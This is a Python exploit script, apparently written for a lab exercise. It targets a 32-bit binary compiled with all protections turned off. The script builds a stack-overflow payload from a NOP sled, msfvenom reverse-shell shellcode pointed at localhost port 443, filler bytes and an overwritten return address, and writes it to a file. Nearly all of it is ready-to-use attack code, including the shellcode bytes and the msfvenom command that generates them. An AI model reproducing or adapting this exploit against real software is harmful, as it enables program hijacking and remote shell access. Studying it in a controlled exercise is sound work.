#!/usr/bin/python

# "alca.c" compiled with --> gcc -m32 -no-pie -fno-stack-protector -z execstack alca.c -o alca

# arch: x86
# protections: none
# vuln type / strategy: stack-based overflow - dropping shellcode onto the stack and jumping to it

# offset: 612
# shellcode: msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -a x86 -b "\x00" -f python

from struct import pack

padding = "\x90"*16

buf =  b""
buf += b"\xda\xdb\xd9\x74\x24\xf4\x5e\xb8\x20\x2d\x06\xfc\x2b"
buf += b"\xc9\xb1\x12\x83\xee\xfc\x31\x46\x13\x03\x66\x3e\xe4"
buf += b"\x09\x57\x9b\x1f\x12\xc4\x58\xb3\xbf\xe8\xd7\xd2\xf0"
buf += b"\x8a\x2a\x94\x62\x0b\x05\xaa\x49\x2b\x2c\xac\xa8\x43"
buf += b"\xd0\x4e\x4b\x92\x46\x4d\x4b\x95\x2d\xd8\xaa\x25\x37"
buf += b"\x8b\x7d\x16\x0b\x28\xf7\x79\xa6\xaf\x55\x11\x57\x9f"
buf += b"\x2a\x89\xcf\xf0\xe3\x2b\x79\x86\x1f\xf9\x2a\x11\x3e"
buf += b"\x4d\xc7\xec\x41"

junk = "A"*(596 - len(buf))

eip = pack('<I', 0xffffceec)

payload = (padding + buf + junk + eip)

with open('sendme', 'w') as file:
    file.write(payload)
